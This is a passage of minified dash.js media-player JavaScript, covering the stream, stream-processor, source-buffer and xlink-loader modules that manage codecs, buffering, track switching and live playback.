Z=J.codec;try{if(Z.match(/application\/mp4;\s*codecs="(stpp|wvtt).*"/i))throw Error("not really supported");if((W=I||z.addSourceBuffer(Z)).changeType&&I&&(ja.debug("Doing period transition with changeType"),W.changeType(Z)),Y&&W&&(W.appendWindowEnd=z.duration),"function"==typeof W.addEventListener)try{W.addEventListener("updateend",h,!1),W.addEventListener("error",F,!1),W.addEventListener("abort",F,!1)}catch(na){ma=setInterval(w,50)}else ma=setInterval(w,50)}catch(na){if(!J.isText&&-1===Z.indexOf('codecs="stpp')&&-1===Z.indexOf('codecs="wvtt'))throw na;W=(0,r.default)(O).getInstance().getTextSourceBuffer()}}(),Q}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(45)),l=v(u(225)),f=v(u(46)),g=v(u(54)),t=v(u(47)),r=v(u(200)),x=v(u(51));m.__dashjs_factory_name="SourceBufferSink",u=t.default.getClassFactory(m),M.default=u,da.exports=M.default},{200:200,225:225,45:45,46:46,47:47,51:51,54:54}],105:[function(u,da,M){function v(G){return G&&G.__esModule?G:{default:G}}function m(G){function N(Sa){for(var rb=Pa?Pa.length:0,nb=0;nb<rb;nb++)Pa[nb].getFragmentModel().removeExecutedRequestsBeforeTime(P()+F()),Pa[nb].reset(!1,Sa);ua=qb=Ta=!(Pa=[]),oa.off(x.default.CURRENT_TRACK_CHANGED,W,hb)}function w(){N(),Da=null,mb=ib=eb=!1,Ab=!(Db={})}function h(){Ca&&Ca.pause(),Za&&(Za.reset(),Za=null),w(),oa.off(x.default.DATA_UPDATE_COMPLETED,Z,hb),oa.off(x.default.BUFFERING_COMPLETED,Y,hb),oa.off(x.default.INBAND_EVENTS,na,hb),db&&(oa.off(x.default.KEY_ERROR,Q,hb),oa.off(x.default.SERVER_CERTIFICATE_UPDATED,Q,hb),oa.off(x.default.LICENSE_REQUEST_COMPLETE,Q,hb),oa.off(x.default.KEY_SYSTEM_SELECTED,Q,hb),oa.off(x.default.KEY_SESSION_CREATED,Q,hb),oa.off(x.default.KEY_STATUSES_CHANGED,Q,hb)),ua=!1}function F(){return Da?Da.duration:NaN}function P(){return Da?Da.start:NaN}function O(){return Da?Da.id:null}function R(){if(!(La&&za&&za.hasOwnProperty("getBitrateList")&&C&&C.hasOwnProperty("getAllMediaInfoForType")&&C.hasOwnProperty("getEventsFor")))throw Error(p.default.MISSING_CONFIG_ERROR)}function Q(Sa){Sa.error&&(qa.error(Sa.error),bb.fatal(Sa.error.message),h())}function ja(Sa){var rb,nb=Sa?Sa.type:null,Bb=void 0;if(nb===p.default.MUXED)return Bb="Multiplexed representations are intentionally not supported, as they are not compliant with the DASH-AVC/264 guidelines",bb.fatal(Bb),void qa.error(new D.default(J.default.MANIFEST_ERROR_ID_MULTIPLEXED_CODE,Bb,ha.getValue()));if(nb===p.default.TEXT||nb===p.default.FRAGMENTED_TEXT||nb===p.default.EMBEDDED_TEXT||nb===p.default.IMAGE)return 1;if(rb=Sa.codec,bb.debug(nb+" codec: "+rb),Sa.contentProtection&&!fa.supportsEncryptedMedia())qa.error(new D.default(J.default.CAPABILITY_MEDIAKEYS_ERROR_CODE,J.default.CAPABILITY_MEDIAKEYS_ERROR_MESSAGE));else if(!fa.supportsCodec(rb))return Bb=nb+"Codec ("+rb+") is not supported.",void bb.error(Bb);return 1}function W(Sa){var rb,nb,Bb,Ib;Da&&Sa.newMediaInfo.streamInfo.id===Da.id&&(rb=Sa.newMediaInfo,nb=ha.getValue(),C.setCurrentMediaInfo(Da.id,rb.type,rb),(Bb=T(rb))&&(Ib=Ca.getTime(),bb.info("Stream -  Process track changed at current time "+Ib),bb.debug("Stream -  Update stream controller"),nb.refreshManifestOnSwitchTrack?(bb.debug("Stream -  Refreshing manifest for switch track"),tb=Sa,la.refreshManifest()):(Bb.selectMediaInfo(rb),rb.type!==p.default.FRAGMENTED_TEXT?(za.updateTopQualityIndex(rb),Bb.switchTrackAsked(),Bb.getFragmentModel().abortRequests()):(Bb.getScheduleController().setSeekTarget(Ib),Bb.setIndexHandlerTime(Ib),Bb.resetIndexHandler()))))}function aa(Sa,rb){var nb=C.getAllMediaInfoForType(Da,Sa),Bb=null;if(nb&&0!==nb.length){Sa===p.default.VIDEO&&(ib=!0),Sa===p.default.AUDIO&&(mb=!0);for(var Ib=0,Qb=nb.length;Ib<Qb;Ib++)Bb=nb[Ib],Sa===p.default.EMBEDDED_TEXT?Ra.addEmbeddedTrack(Bb):ja(Bb)&&Ga.addTrack(Bb);if(Sa!==p.default.EMBEDDED_TEXT&&0!==Ga.getTracksFor(Sa,Da).length)if(Sa!==p.default.IMAGE)if(Ga.checkInitialMediaSettingsForType(Sa,Da),Sa=Ga.getCurrentTrackFor(Sa,Da),oa.trigger(x.default.STREAM_INITIALIZING,{streamInfo:Da,mediaInfo:Bb}),Bb=Za.getModel(O(),Sa?Sa.type:null),(Bb=(0,f.default)(V).create({streamInfo:Da,type:Sa?Sa.type:null,mimeType:Sa?Sa.mimeType:null,timelineConverter:va,adapter:C,manifestModel:ha,mediaPlayerModel:ka,fragmentModel:Bb,dashMetrics:G.dashMetrics,baseURLController:G.baseURLController,abrController:za,playbackController:Ca,mediaController:Ga,textController:Ra,errHandler:qa,settings:Ya,boxParser:Ka})).initialize(rb,ib),za.updateTopQualityIndex(Sa),Pa.push(Bb),!Sa||Sa.type!==p.default.TEXT&&Sa.type!==p.default.FRAGMENTED_TEXT)Bb.addMediaInfo(Sa,!0);else{for(rb=void 0,Ib=0;Ib<nb.length;Ib++)nb[Ib].index===Sa.index&&(rb=Ib),Bb.addMediaInfo(nb[Ib]);Bb.selectMediaInfo(nb[rb])}else $a=(0,t.default)(V).create({streamInfo:Da,adapter:C,baseURLController:G.baseURLController,timelineConverter:G.timelineConverter,debug:Fa,eventBus:oa,events:x.default,dashConstants:l.default})}else bb.info("No "+Sa+" data.")}function ma(){var Sa;Ba&&(Sa=C.getEventsFor(Da),Ba.addInlineEvents(Sa))}function H(Sa){var rb=C.getAdaptationForType(Da?Da.index:null,Sa,Da);rb&&Array.isArray(rb.Representation_asArray)&&(rb.Representation_asArray=rb.Representation_asArray.filter((function(nb,Bb){return 0===Bb||(nb=C.getCodec(rb,Bb,!0),!!fa.supportsCodec(nb)||(bb.error("[Stream] codec not supported: "+nb),!1))})))}function B(){for(var Sa=Pa.length,rb=Db.audio||Db.video?new D.default(J.default.DATA_UPDATE_FAILED_ERROR_CODE,J.default.DATA_UPDATE_FAILED_ERROR_MESSAGE):null,nb=0;nb<Sa;nb++)if(Pa[nb].isUpdating()||Ab)return;if(qb){if(db)for(nb=0;nb<Sa&&Pa[nb];nb++)Pa[nb].getType()!==p.default.AUDIO&&Pa[nb].getType()!==p.default.VIDEO&&Pa[nb].getType()!==p.default.FRAGMENTED_TEXT||db.initializeForMedia(Pa[nb].getMediaInfo());for(rb?qa.error(rb):eb||(eb=!0,va.setTimeSyncCompleted(!0),oa.trigger(x.default.STREAM_INITIALIZED,{streamInfo:Da,liveStartTime:function(){if(!Da.manifestInfo.isDynamic)return NaN;for(var Bb=0;Bb<Pa.length;Bb++)if(Pa[Bb].getType()===p.default.AUDIO||Pa[Bb].getType()===p.default.VIDEO)return Pa[Bb].getLiveStartTime();return NaN}()})),nb=0;nb<Sa&&Pa[nb];nb++)Pa[nb].getScheduleController().start()}}function A(Sa){for(var rb={},nb=0,Bb=Pa.length;nb<Bb;nb++){var Ib=Pa[nb].createBuffer(Sa);Ib&&(rb[Pa[nb].getType()]=Ib.getBuffer())}return rb}function Y(Sa){if(Sa.streamId===Da.id){var rb=(Sa=pa()).length;if(0!==rb){for(var nb=0;nb<rb;nb++)if(!Sa[nb].isBufferingCompleted()&&(Sa[nb].getType()===p.default.AUDIO||Sa[nb].getType()===p.default.VIDEO))return void bb.warn("onBufferingCompleted - One streamProcessor has finished but",Sa[nb].getType(),"one is not buffering completed");bb.debug("onBufferingCompleted - trigger STREAM_BUFFERING_COMPLETED"),oa.trigger(x.default.STREAM_BUFFERING_COMPLETED,{streamInfo:Da})}else bb.warn("onBufferingCompleted - can't trigger STREAM_BUFFERING_COMPLETED because no streamProcessor is defined")}}function Z(Sa){Da&&Sa.sender.getStreamId()===Da.id&&(Db[Sa.sender.getType()]=Sa.error,B())}function na(Sa){var rb;Da&&Sa.sender.getStreamInfo().id===Da.id&&(rb=Sa.events,Ba&&Ba.addInbandEvents(rb))}function T(Sa){return Sa?pa().filter((function(rb){return rb.getType()===Sa.type}))[0]:null}function pa(){for(var Sa=[],rb=void 0,nb=void 0,Bb=0;Bb<Pa.length;Bb++)(rb=(nb=Pa[Bb]).getType())!==p.default.AUDIO&&rb!==p.default.VIDEO&&rb!==p.default.FRAGMENTED_TEXT&&rb!==p.default.TEXT||Sa.push(nb);return Sa}function ia(Sa,rb){if(!Sa)return!1;var nb=Sa.getStreamInfo();return Sa=Da,!(!nb||!Sa||(nb=C.getAdaptationForType(nb.index,rb,nb),rb=C.getAdaptationForType(Sa.index,rb,Sa),nb&&rb?nb.ContentProtection||rb.ContentProtection:nb||rb))}function S(Sa,rb){if(!Sa||!Sa.hasOwnProperty("getStreamInfo"))return!1;Sa=Sa.getStreamInfo();var nb=Da;if(!Sa||!nb)return!1;if(Sa=C.getAdaptationForType(Sa.index,rb,Sa),nb=C.getAdaptationForType(nb.index,rb,nb),!Sa||!nb)return!Sa&&!nb;rb=Sa&&nb&&Sa.mimeType===nb.mimeType;var Bb=nb.Representation_asArray.map((function(Ib){return Ib.codecs}));return nb=Sa.Representation_asArray.map((function(Ib){return Ib.codecs})),Sa=nb.some((function(Ib){return-1<Bb.indexOf(Ib)})),nb=nb.some((function(Ib){return Bb.some((function(Qb){return function(Vb,Zb){Vb=Vb.split(".")[0];for(var oc=0===Zb.indexOf(Vb),pc=void 0,Xa=0;Xa<Eb.length;Xa++)if(Eb[Xa].codec===Vb){pc=Eb[Xa];break}return pc?oc||pc.compatibleCodecs.some((function(ob){return 0===Zb.indexOf(ob)})):oc}(Qb,Ib)}))})),Sa||nb&&rb}G=G||{};var V=this.context,oa=(0,r.default)(V).getInstance(),ba=(0,L.default)(V).getInstance(),ha=G.manifestModel,ka=G.mediaPlayerModel,la=G.manifestUpdater,C=G.adapter,fa=G.capabilities,qa=G.errHandler,va=G.timelineConverter,xa=G.dashMetrics,za=G.abrController,Ca=G.playbackController,Ba=G.eventController,Ga=G.mediaController,Ra=G.textController,La=G.videoModel,Ya=G.settings,hb=void 0,bb=void 0,Da=void 0,Pa=void 0,eb=void 0,Ta=void 0,qb=void 0,ib=void 0,mb=void 0,Db=void 0,Ab=void 0,db=void 0,Za=void 0,$a=void 0,ua=void 0,Ka=void 0,Fa=void 0,tb=void 0,Eb=[{codec:"avc1",compatibleCodecs:["avc3"]},{codec:"avc3",compatibleCodecs:["avc1"]}];return hb={initialize:function(Sa,rb){Da=Sa,(db=rb)&&(oa.on(x.default.KEY_ERROR,Q,hb),oa.on(x.default.SERVER_CERTIFICATE_UPDATED,Q,hb),oa.on(x.default.LICENSE_REQUEST_COMPLETE,Q,hb),oa.on(x.default.KEY_SYSTEM_SELECTED,Q,hb),oa.on(x.default.KEY_SESSION_CREATED,Q,hb),oa.on(x.default.KEY_STATUSES_CHANGED,Q,hb))},activate:function(Sa,rb){if(Ta)return rb;if(oa.on(x.default.CURRENT_TRACK_CHANGED,W,hb),ua)Ab=!0,R(),H(p.default.VIDEO),H(p.default.AUDIO),Ab=!(qb=!0),0===Pa.length?(qa.error(new D.default(J.default.MANIFEST_ERROR_ID_NOSTREAMS_CODE,"No streams to play.",ha.getValue())),bb.debug("No streams to play.")):B(),Sa=rb;else{R();var Bb=La.getElement();ma(),Ab=!0,H(p.default.VIDEO),H(p.default.AUDIO),(!Bb||Bb&&/^VIDEO$/i.test(Bb.nodeName))&&aa(p.default.VIDEO,Sa),aa(p.default.AUDIO,Sa),aa(p.default.TEXT,Sa),aa(p.default.FRAGMENTED_TEXT,Sa),aa(p.default.EMBEDDED_TEXT,Sa),aa(p.default.MUXED,Sa),aa(p.default.IMAGE,Sa),Sa=A(rb),Ab=!(qb=!0),0===Pa.length?(qa.error(new D.default(J.default.MANIFEST_ERROR_ID_NOSTREAMS_CODE,"No streams to play.",ha.getValue())),bb.fatal("No streams to play.")):B()}return Ta=!0,Sa},deactivate:N,isActive:function(){return Ta},getDuration:F,getStartTime:P,getId:O,getStreamInfo:function(){return Da},getHasAudioTrack:function(){return mb},getHasVideoTrack:function(){return ib},preload:function(Sa,rb){for(ma(),aa(p.default.VIDEO,Sa),aa(p.default.AUDIO,Sa),aa(p.default.TEXT,Sa),aa(p.default.FRAGMENTED_TEXT,Sa),aa(p.default.EMBEDDED_TEXT,Sa),aa(p.default.MUXED,Sa),aa(p.default.IMAGE,Sa),A(rb),oa.on(x.default.CURRENT_TRACK_CHANGED,W,hb),Sa=0;Sa<Pa.length&&Pa[Sa];Sa++)Pa[Sa].getScheduleController().start();ua=!0},getThumbnailController:function(){return $a},getBitrateListFor:function(Sa){if(R(),Sa===p.default.IMAGE)return $a?$a.getBitrateList():[];a:{for(var rb,nb=0;nb<Pa.length;nb++)if((rb=Pa[nb]).getType()===Sa){Sa=rb.getMediaInfo();break a}Sa=null}return za.getBitrateList(Sa)},updateData:function(Sa){bb.info("Manifest updated... updating data system wide."),Ab=!(Ta=!1),Da=Sa,Ba&&ma(),H(p.default.VIDEO),H(p.default.AUDIO),Sa=0;for(var rb=Pa.length;Sa<rb;Sa++){var nb=Pa[Sa];nb.updateStreamInfo(Da);var Bb=C.getMediaInfoForType(Da,nb.getType());za.updateTopQualityIndex(Bb),nb.addMediaInfo(Bb,!0)}if(tb&&tb.newMediaInfo.type!==p.default.FRAGMENTED_TEXT){if(!(Sa=T(tb.oldMediaInfo)))return;Sa.switchTrackAsked(),tb=void 0}Ab=!1,B()},reset:h,getProcessors:pa,setMediaSource:function(Sa){for(var rb=0;rb<Pa.length;)ja(Pa[rb].getMediaInfo())?(Pa[rb].setMediaSource(Sa),rb++):(Pa[rb].reset(),Pa.splice(rb,1));for(rb=0;rb<Pa.length;rb++)Pa[rb].dischargePreBuffer();0===Pa.length&&(qa.error(new D.default(J.default.MANIFEST_ERROR_ID_NOSTREAMS_CODE,"No streams to play.nostreams",ha.getValue())),bb.fatal("No streams to play."))},isMediaCodecCompatible:function(Sa){return S(Sa,p.default.VIDEO)&&S(Sa,p.default.AUDIO)},isProtectionCompatible:function(Sa){return ia(Sa,p.default.VIDEO)&&ia(Sa,p.default.AUDIO)},getPreloaded:function(){return ua}},Fa=(0,z.default)(V).getInstance(),bb=Fa.getLogger(hb),w(),Ka=(0,I.default)(V).getInstance(),Za=(0,g.default)(V).create({mediaPlayerModel:ka,dashMetrics:xa,errHandler:qa,settings:Ya,boxParser:Ka,dashConstants:l.default,urlUtils:ba}),oa.on(x.default.BUFFERING_COMPLETED,Y,hb),oa.on(x.default.DATA_UPDATE_COMPLETED,Z,hb),oa.on(x.default.INBAND_EVENTS,na,hb),hb}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(108)),l=v(u(61)),f=v(u(106)),g=v(u(116)),t=v(u(203)),r=v(u(46)),x=v(u(54)),z=v(u(45)),J=v(u(51)),E=v(u(47)),D=v(u(225)),I=v(u(206)),L=v(u(220));m.__dashjs_factory_name="Stream",M.default=E.default.getClassFactory(m),da.exports=M.default},{106:106,108:108,116:116,203:203,206:206,220:220,225:225,45:45,46:46,47:47,51:51,54:54,61:61}],106:[function(u,da,M){function v(ja){return ja&&ja.__esModule?ja:{default:ja}}function m(ja){function W(Za){Za.sender.getType()===la&&Za.sender.getStreamId()===ka.id&&(Za.error||mb.setCurrentRepresentation(va.convertDataToRepresentationInfo(Za.currentRepresentation)),Za.error&&Za.error.code!==N.default.SEGMENTS_UPDATE_FAILED_ERROR_CODE||A())}function aa(Za){var $a;la===Za.mediaType&&ka.id===Za.streamInfo.id&&($a=Z(Za.newQuality),mb.setCurrentRepresentation($a),Ya.pushPlayListTraceMetrics(new Date,Q.PlayListTrace.REPRESENTATION_SWITCH_STOP_REASON),Ya.createPlaylistTraceMetrics($a.id,1e3*Ga.getTime(),Ga.getPlaybackRate()))}function ma(Za){Za.streamId===ka.id&&Za.mediaType===la&&(Ya.addBufferLevel(la,new Date,1e3*Za.bufferLevel),xa.getValue().doNotUpdateDVRWindowOnBufferUpdated||A())}function H(Za){Za.streamId===ka.id&&Za.mediaType===la&&(Ya.addBufferState(la,Za.state,mb.getBufferTarget()),Za.state!==f.default.BUFFER_EMPTY||Ga.isSeeking()||Ya.pushPlayListTraceMetrics(new Date,Q.PlayListTrace.REBUFFERING_REASON))}function B(Za){Za.streamId===ka.id&&Za.mediaType===la&&(Za.unintended?Ca.removeExecutedRequestsAfterTime(Za.from):Ca.syncExecutedRequestsWithBufferedRange(ib.getBuffer().getAllBufferRanges(),ka.duration))}function A(){var Za=ka.manifestInfo,$a=Za.isDynamic;$a=qa.calcSegmentAvailabilityRange(Db.getCurrentRepresentation(),$a),Ya.addDVRInfo(la,Ga.getTime(),Za,$a)}function Y(){return ib?ib.getBuffer():null}function Z(Za){return Za=void 0!==Za?((0,D.checkInteger)(Za),Db?Db.getRepresentationForQuality(Za):null):Db?Db.getCurrentRepresentation():null,va.convertDataToRepresentationInfo(Za)}function na(Za){var $a;Za.sender&&Za.mediaType===la&&Za.streamId===ka.id&&(va.getIsTextTrack(fa)&&!La.isTextEnabled()||ib&&Za.representationId&&(ib.appendInitSegment(Za.representationId)||($a=db?db.getInitRequest(Ta,Db.getCurrentRepresentation()):null,mb.processInitRequest($a))))}function T(Za){if(Za.sender&&Za.mediaType===la&&Za.streamId===ka.id){var $a=void 0;if(!ib.getIsPruningInProgress()){var ua=Za.seekTarget,Ka=Za.replacement,Fa=Z(),tb=!isNaN(ua),Eb=Ga.getNormalizedTime();ua=tb?ua:V();var Sa=!1;if(isNaN(ua)||la===p.default.FRAGMENTED_TEXT&&!La.isTextEnabled())Fa=null;else{var rb,nb;if(ib&&(rb=ib.getRangeAt(ua),nb=ib.getRangeAt(Eb),null===rb&&null===nb||tb||(!rb||nb&&nb.start!=rb.start&&nb.end!=rb.end)&&ib.getBuffer().hasDiscontinuitiesAfter(Eb)&&la!==p.default.FRAGMENTED_TEXT&&(Ca.removeExecutedRequestsAfterTime(nb.end),Sa=!0)),Ka)Ka=oa(Fa,ua=Ka.startTime+Ka.duration/2,{timeThreshold:0,ignoreIsFinished:!0});else for(Ka=oa(Fa,tb||Sa?ua:void 0,{keepIdx:!tb&&!Sa});Ka&&Ka.action!==R.default.ACTION_COMPLETE&&Ca.isFragmentLoaded(Ka);)Ka=oa(Fa);Fa=Ka}($a=Fa)&&(mb.setSeekTarget(NaN),Za.replacement||(isNaN($a.startTime+$a.duration)||S($a.startTime+$a.duration),$a.delayLoadingTime=(new Date).getTime()+mb.getTimeToLoadDelay(),mb.setTimeToLoadDelay(0)))}mb.processMediaRequest($a)}}function pa(Za){var $a,ua=Za.chunk;if(ua.streamId===ka.id&&ua.mediaInfo.type==la){Za=ua.bytes;var Ka=Z($a=ua.quality),Fa=Db&&Ka?Db.getRepresentationForQuality(Ka.quality):null,tb=va.getEventsFor(Ka.mediaInfo);if(Fa=va.getEventsFor(Ka,Fa),tb&&0<tb.length||Fa&&0<Fa.length){$a=Ca.getRequests({state:g.default.FRAGMENT_MODEL_EXECUTED,quality:$a,index:ua.index})[0],$a=Math.max(!$a||isNaN($a.startTime)?0:$a.startTime,0),ua=[],Ka=[];var Eb=tb.concat(Fa);for(tb=0,Fa=Eb.length;tb<Fa;tb++)ua[Eb[tb].schemeIdUri+"/"+Eb[tb].value]=Eb[tb];for(tb=0,Fa=(Za=(0,O.default)(ba).getInstance().parse(Za).getBoxes("emsg")).length;tb<Fa;tb++)(Eb=va.getEvent(Za[tb],ua,$a))&&Ka.push(Eb);ha.trigger(L.default.INBAND_EVENTS,{sender:Da,events:Ka})}}}function ia(Za){Za.mediaType===la&&Za.streamId===ka.id&&(S(Za.time),mb.setSeekTarget(Za.time))}function S(Za){db&&db.setCurrentTime(Za)}function V(){return db?db.getCurrentTime():NaN}function oa(Za,$a,ua){var Ka,Fa=null;return db&&(Ka=Db&&Za?Db.getRepresentationForQuality(Za.quality):null,Fa=void 0!==$a&&void 0!==ua?db.getSegmentRequestForTime(Ta,Ka,$a,ua):db.getNextSegmentRequest(Ta,Ka)),Fa}ja=ja||{};var ba=this.context,ha=(0,I.default)(ba).getInstance(),ka=ja.streamInfo,la=ja.type,C=ja.errHandler,fa=ja.mimeType,qa=ja.timelineConverter,va=ja.adapter,xa=ja.manifestModel,za=ja.mediaPlayerModel,Ca=ja.fragmentModel,Ba=ja.abrController,Ga=ja.playbackController,Ra=ja.mediaController,La=ja.textController,Ya=ja.dashMetrics,hb=ja.settings,bb=ja.boxParser,Da=void 0,Pa=void 0,eb=void 0,Ta=void 0,qb=void 0,ib=void 0,mb=void 0,Db=void 0,Ab=void 0,db=void 0;return Da={initialize:function(Za,$a){db=(0,G.default)(ba).create({streamInfo:ka,type:la,timelineConverter:qa,dashMetrics:Ya,mediaPlayerModel:za,baseURLController:ja.baseURLController,errHandler:C,settings:hb,boxParser:bb,events:L.default,eventBus:ha,errors:N.default,debug:(0,h.default)(ba).getInstance(),requestModifier:(0,F.default)(ba).getInstance(),dashConstants:l.default,constants:p.default,urlUtils:(0,P.default)(ba).getInstance()}),(eb=ka.manifestInfo.isDynamic)&&(Ab=(0,J.default)(ba).create({timelineConverter:qa})),db.initialize(eb),Ba.registerStreamType(la,Da),Db=(0,z.default)(ba).create({streamId:ka.id,type:la,abrController:Ba,dashMetrics:Ya,playbackController:Ga,timelineConverter:qa,dashConstants:l.default,events:L.default,eventBus:ha,errors:N.default});var ua=(ua=la)?ua===p.default.VIDEO||ua===p.default.AUDIO?(0,t.default)(ba).create({streamInfo:ka,type:ua,mediaPlayerModel:za,manifestModel:xa,fragmentModel:Ca,errHandler:C,mediaController:Ra,representationController:Db,adapter:va,textController:La,abrController:Ba,playbackController:Ga,settings:hb}):(0,r.default)(ba).create({streamInfo:ka,type:ua,mimeType:fa,mediaPlayerModel:za,manifestModel:xa,fragmentModel:Ca,errHandler:C,mediaController:Ra,representationController:Db,adapter:va,textController:La,abrController:Ba,playbackController:Ga,settings:hb}):(C.error(new w.default(N.default.MEDIASOURCE_TYPE_UNSUPPORTED_CODE,N.default.MEDIASOURCE_TYPE_UNSUPPORTED_MESSAGE+"not properly defined")),null);(ib=ua)&&ib.initialize(Za),(mb=(0,x.default)(ba).create({streamId:ka.id,type:la,mimeType:fa,adapter:va,dashMetrics:Ya,mediaPlayerModel:za,fragmentModel:Ca,abrController:Ba,playbackController:Ga,textController:La,mediaController:Ra,bufferController:ib,settings:hb})).initialize($a)},isUpdating:function(){return!!Db&&Db.isUpdating()},getType:function(){return la},getBufferController:function(){return ib},getFragmentModel:function(){return Ca},getScheduleController:function(){return mb},getRepresentationController:function(){return Db},getRepresentationInfo:Z,getBufferLevel:function(){return ib?ib.getBufferLevel():0},isBufferingCompleted:function(){return!!ib&&ib.getIsBufferingCompleted()},createBuffer:function(Za){return Y()||ib?ib.createBuffer(qb,Za):null},updateStreamInfo:function(Za){ka=Za},getStreamInfo:function(){return ka},selectMediaInfo:function(Za){var $a,ua,Ka,Fa,tb;Za===Ta||Za&&Ta&&Za.type!==Ta.type||(Ta=Za),Za=va.getRealAdaptation(ka,Ta);var Eb=va.getVoRepresentations(Ta);Db&&($a=Db.getData(),ua=Ba.getTopQualityIndexFor(la,ka.id),Ka=Ba.getMinAllowedIndexFor(la),tb=null!==$a&&$a.id==Za.id||la===p.default.FRAGMENTED_TEXT?Ba.getQualityFor(la):(Fa=Ba.getThroughputHistory().getAverageThroughput(la)||Ba.getInitialBitrateFor(la),Ba.getQualityForBitrate(Ta,Fa)),void 0!==Ka&&tb<Ka&&(tb=Ka),ua<tb&&(tb=ua),db.setMimeType(Ta?Ta.mimeType:null),Db.updateData(Za,Eb,la,tb))},addMediaInfo:function(Za,$a){-1===qb.indexOf(Za)&&qb.push(Za),$a&&this.selectMediaInfo(Za)},getLiveStartTime:function(){if(!eb||!Ab)return NaN;var Za=NaN,$a=Z(),ua=Ab.getLiveEdge($a);try{var Ka=null,Fa=Ga.getLiveDelay(),tb=isNaN(ka.manifestInfo.DVRWindowSize)?Fa:ka.manifestInfo.DVRWindowSize,Eb=.1*tb,Sa=void 0;if(!isFinite(tb)||oa($a,ua-tb+Eb,{ignoreIsFinished:!0}))for(;!Ka&&Fa<=tb;)(Ka=oa($a,Sa=ua-Fa,{ignoreIsFinished:!0}))||(Fa+=1);var rb=(Ka&&Ga.setLiveDelay(Fa,!0),Pa.debug("live edge: "+ua+", live delay: "+Fa+", live target: "+Sa),Ka)}catch(nb){rb=null}return rb&&(Za=!hb.get().streaming.lowLatencyEnabled||rb.duration<za.getLiveDelay()?rb.startTime:rb.startTime+rb.duration-za.getLiveDelay()),Za},switchTrackAsked:function(){mb.switchTrackAsked()},getMediaInfoArr:function(){return qb},getMediaInfo:function(){return Ta},getMediaSource:function(){return ib.getMediaSource()},setMediaSource:function(Za){ib.setMediaSource(Za,qb)},dischargePreBuffer:function(){ib.dischargePreBuffer()},getBuffer:Y,setBuffer:function(Za){ib.setBuffer(Za)},setIndexHandlerTime:S,getIndexHandlerTime:V,resetIndexHandler:function(){db&&db.resetIndex()},getInitRequest:function(Za){return(0,D.checkInteger)(Za),Za=Db?Db.getRepresentationForQuality(Za):null,db?db.getInitRequest(Ta,Za):null},getFragmentRequest:oa,finalisePlayList:function(Za,$a){Ya.pushPlayListTraceMetrics(Za,$a)},reset:function(Za,$a){db&&db.reset(),ib&&(ib.reset(Za,$a),ib=null),mb&&(mb.reset(),mb=null),Db&&(Db.reset(),Db=null),Ab&&(Ab.reset(),Ab=null),Ba&&Ba.unRegisterStreamType(la),ha.off(L.default.DATA_UPDATE_COMPLETED,W,Da),ha.off(L.default.QUALITY_CHANGE_REQUESTED,aa,Da),ha.off(L.default.INIT_FRAGMENT_NEEDED,na,Da),ha.off(L.default.MEDIA_FRAGMENT_NEEDED,T,Da),ha.off(L.default.MEDIA_FRAGMENT_LOADED,pa,Da),ha.off(L.default.BUFFER_LEVEL_UPDATED,ma,Da),ha.off(L.default.BUFFER_LEVEL_STATE_CHANGED,H,Da),ha.off(L.default.BUFFER_CLEARED,B,Da),ha.off(L.default.SEEK_TARGET,ia,Da),qb=[],ka=la=Ta=null}},Pa=(0,h.default)(ba).getInstance().getLogger(Da),qb=[],Ta=null,ha.on(L.default.DATA_UPDATE_COMPLETED,W,Da,I.default.EVENT_PRIORITY_HIGH),ha.on(L.default.QUALITY_CHANGE_REQUESTED,aa,Da),ha.on(L.default.INIT_FRAGMENT_NEEDED,na,Da),ha.on(L.default.MEDIA_FRAGMENT_NEEDED,T,Da),ha.on(L.default.MEDIA_FRAGMENT_LOADED,pa,Da),ha.on(L.default.BUFFER_LEVEL_UPDATED,ma,Da),ha.on(L.default.BUFFER_LEVEL_STATE_CHANGED,H,Da),ha.on(L.default.BUFFER_CLEARED,B,Da),ha.on(L.default.SEEK_TARGET,ia,Da),Da}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(108)),l=v(u(61)),f=v(u(109)),g=v(u(149)),t=v(u(114)),r=v(u(199)),x=v(u(120)),z=v(u(62)),J=v(u(215)),E=v(u(47)),D=u(218),I=v(u(46)),L=v(u(54)),G=v(u(57)),N=v(u(51)),w=v(u(225)),h=v(u(45)),F=v(u(217)),P=v(u(220)),O=v(u(206)),R=v(u(227)),Q=u(243);m.__dashjs_factory_name="StreamProcessor",M.default=E.default.getClassFactory(m),da.exports=M.default},{108:108,109:109,114:114,120:120,149:149,199:199,206:206,215:215,217:217,218:218,220:220,225:225,227:227,243:243,45:45,46:46,47:47,51:51,54:54,57:57,61:61,62:62}],107:[function(u,da,M){function v(J){return J&&J.__esModule?J:{default:J}}function m(J){J=J||{};var E=this.context,D=(0,t.default)(E).getInstance(),I=(0,l.default)(E).create({errHandler:J.errHandler,dashMetrics:J.dashMetrics,mediaPlayerModel:J.mediaPlayerModel,requestModifier:J.requestModifier,useFetch:J.settings?J.settings.get().streaming.lowLatencyEnabled:null,errors:z.default});return{load:function(L,G,N){function w(F,P){G.resolved=!0,G.resolvedContent=F||null,D.trigger(r.default.XLINK_ELEMENT_LOADED,{element:G,resolveObject:N,error:F||P?null:new p.default(z.default.XLINK_LOADER_LOADING_FAILURE_ERROR_CODE,z.default.XLINK_LOADER_LOADING_FAILURE_ERROR_MESSAGE+L)})}var h;"urn:mpeg:dash:resolve-to-zero:2013"===L?w(null,!0):(h=new g.default(L,f.HTTPRequest.XLINK_EXPANSION_TYPE),I.load({request:h,success:function(F){w(F)},error:function(){w(null)}}))},reset:function(){I&&(I.abort(),I=null)}}}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(225)),l=v(u(158)),f=u(241),g=v(u(232)),t=v(u(46)),r=v(u(54)),x=v(u(47)),z=v(u(51));m.__dashjs_factory_name="XlinkLoader",M.default=x.default.getClassFactory(m),da.exports=M.default},{158:158,225:225,232:232,241:241,46:46,47:47,51:51,54:54}],108:[function(u,da,M){function v(p,l){for(var f=0;f<l.length;f++){var g=l[f];g.enumerable=g.enumerable||!1,g.configurable=!0,"value"in g&&(g.writable=!0),Object.defineProperty(p,g.key,g)}}function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");this.init()}var 